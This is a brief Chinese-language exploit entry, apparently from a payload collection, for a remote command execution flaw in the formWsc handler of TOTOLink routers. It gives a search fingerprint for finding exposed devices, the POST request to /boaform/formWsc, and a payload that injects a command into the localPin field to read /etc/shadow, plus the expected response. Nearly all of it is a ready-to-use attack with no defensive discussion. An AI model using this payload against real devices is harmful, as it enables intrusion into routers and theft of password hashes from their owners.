# TOTOLinkformWsc存在远程命令执行漏洞.docx

TOTOLinkformWsc ｜ 命令执行 ｜ —
- **指纹**：`title="TOTOLINK"`
- **请求**：`POST /boaform/formWsc HTTP/1.1`

**Payload**
```
targetAPMac=001A2B3C4D5E&targetAPSsid=3232&submit-url=aaaaaa&localPin=aaaa%20%20cat%20/etc/shadow
```
- **响应特征**：200